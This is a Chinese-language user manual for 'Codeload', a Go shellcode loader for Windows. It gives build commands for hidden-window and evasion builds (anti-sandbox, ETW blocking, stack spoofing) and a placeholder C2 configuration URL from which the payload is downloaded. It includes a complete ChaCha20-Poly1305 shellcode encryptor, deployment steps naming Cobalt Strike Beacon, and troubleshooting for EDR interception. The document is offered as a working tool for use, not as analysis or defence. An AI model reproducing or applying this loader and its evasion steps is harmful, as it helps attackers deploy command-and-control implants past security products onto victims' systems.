# Codeload 使用手册

## 1. 编译指南

本项目使用 Go 语言开发，由于涉及底层系统调用和汇编，编译时需注意 `Build Tags` 的使用。

### 1.1 基础 Release 版本 (上线推荐)
不包含任何日志及调试信息，最大限度减小指纹残留。
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o release.exe
```
*   `-H=windowsgui`: 隐藏控制台窗口。
*   `-s -w`: 移除调试符号。

### 1.2 增强 Evasion 版本
开启所有规避特性（反沙箱、ETW屏蔽、栈欺骗）。
```bash
GOOS=windows GOARCH=amd64 go build -tags "sandbox,evasion" -ldflags="-s -w -H=windowsgui" -o codeload_adv.exe
```

### 1.3 Debug 调试版本
开启控制台实时输出，用于排查 Payload 加载失败原因。
```bash
GOOS=windows GOARCH=amd64 go build -tags "debug,sandbox,evasion" -ldflags="-s -w" -o debug.exe
```
*   **注意**: Debug 版移除了 `-H=windowsgui`，运行时会弹出黑窗口显示详细日志。

---

## 2. 配置说明

在编译前，需在 `main.go` 中配置远程 C2 地址：

```go
var (
    // 此 URL 应当指向一个存储着 Payload 真实下载地址的文本文件
    configURL = "http://your-c2-domain.com/config.txt"
)
```

---

## 3. Payload 准备与加密

Codeload 采用自定义的加密格式（ChaCha20-Poly1305），Payload 结构中包含 512 字节随机填充及 4 字节长度头。必须使用配套的加密脚本处理原始 Shellcode。

### 3.1 加密脚本 (`encryptor.go`)
将以下代码保存并运行：

```go
package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"golang.org/x/crypto/chacha20poly1305"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("用法: go run encryptor.go <原始载荷.bin> <输出文件.enc>")
		return
	}
	sc, _ := os.ReadFile(os.Args[1])
	
	// 构造明文: [512字节填充] [4字节长度] [Shellcode]
	pad := make([]byte, 512)
	rand.Read(pad)
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(sc)))
	plaintext := append(pad, lenBuf...)
	plaintext = append(plaintext, sc...)

	// 生成密钥与随机数
	key := make([]byte, chacha20poly1305.KeySize)
	nonce := make([]byte, chacha20poly1305.NonceSize)
	rand.Read(key)
	rand.Read(nonce)

	aead, _ := chacha20poly1305.New(key)
	ciphertext := aead.Seal(nil, nonce, plaintext, nil)

	// 最终结构: [Nonce] [密文] [Key]
	final := append(nonce, ciphertext...)
	final = append(final, key...)
	os.WriteFile(os.Args[2], final, 0644)
	fmt.Printf("[+] 加密载荷已保存: %s\n", os.Args[2])
}
```

### 3.2 部署步骤
1. 使用上述脚本加密你的 Shellcode (如 Cobalt Strike Beacon)。
2. 将加密后的文件上传至 Web 服务器。
3. 将该文件的 URL 写入 `config.txt` 并上传至 `configURL` 指向的位置。

---

## 4. 常见问题排查 (Debug 模式)

如果在上线过程中遇到失败，请编译 Debug 版本并观察输出：
- **`[-] Uptime check failed`**: 系统运行时间不足 10 分钟（反沙箱触发）。
- **`[-] Failed to get SSN`**: 系统调用号解析失败，可能是 `ntdll` 结构异常或 EDR 深度拦截。
- **`[-] Config download failed`**: 网络连接问题，检查 C2 地址及证书配置（uTLS）。
- **`[-] Protect RX failed`**: 内存权限修改失败，可能是由于写权限探测警报。
